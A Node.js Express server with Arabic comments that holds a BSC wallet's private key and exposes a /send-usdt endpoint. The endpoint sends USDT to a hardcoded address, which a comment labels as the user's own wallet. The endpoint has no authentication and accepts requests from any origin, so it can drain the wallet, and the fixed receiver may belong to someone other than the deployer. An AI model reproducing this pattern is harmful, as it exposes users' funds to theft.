require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Serve static files from public folder
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));
console.log(`📂 Static files served from ${publicPath}`);

// إعداد شبكة BSC
const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');

// عنوان عقد USDT على شبكة BSC
const usdtAddress = '0x55d398326f99059fF775485246999027B3197955';
const usdtAbi = [
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function balanceOf(address account) external view returns (uint256)"
];

const privateKey = process.env.PRIVATE_KEY;
if (!privateKey) {
  console.error("⚠️ يجب تعيين PRIVATE_KEY في ملف .env");
  process.exit(1);
}

const wallet = new ethers.Wallet(privateKey, provider);
const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, wallet);

console.log("🎯 Your wallet address is:", wallet.address);

// API: عنوان المحفظة
app.get('/wallet-address', (req, res) => {
  console.log("GET /wallet-address");
  res.json({ address: wallet.address });
});

// API: الحصول على رصيد USDT لأي عنوان
app.get('/balance', async (req, res) => {
  console.log("GET /balance", req.query);
  try {
    const address = req.query.address;
    if (!address) {
      return res.status(400).json({ error: 'Address required' });
    }
    const balanceRaw = await usdtContract.balanceOf(address);
    const balance = ethers.formatUnits(balanceRaw, 18);
    console.log(`Balance of ${address}: ${balance}`);
    res.json({ balance });
  } catch (err) {
    console.error("Error in /balance:", err.message);
    res.status(500).json({ error: err.message });
  }
});

// API: جمع الأرباح → ترسل دائمًا إلى محفظتك الخاصة
app.post('/send-usdt', async (req, res) => {
  console.log("POST /send-usdt", req.body);

  try {
    const { amount } = req.body;

    if (!amount || amount <= 0) {
      return res.status(400).json({ success: false, error: 'Amount must be > 0' });
    }

    // 🟢 المحفظة التي تستلم الأرباح (محفظتك الخاصة)
    const receiverAddress = '0x1cF14e559b8dD7d32c2Ef8fcD6D2C3e6FbB95141';

    const amountWei = ethers.parseUnits(amount.toString(), 18);
    console.log(`Transferring ${amount} USDT to ${receiverAddress}`);

    const tx = await usdtContract.transfer(receiverAddress, amountWei);
    await tx.wait();

    console.log("Transaction hash:", tx.hash);
    res.json({ success: true, txHash: tx.hash });

  } catch (err) {
    console.error("Error in send-usdt:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`✅ Wallet address (receiving): ${wallet.address}`);
});
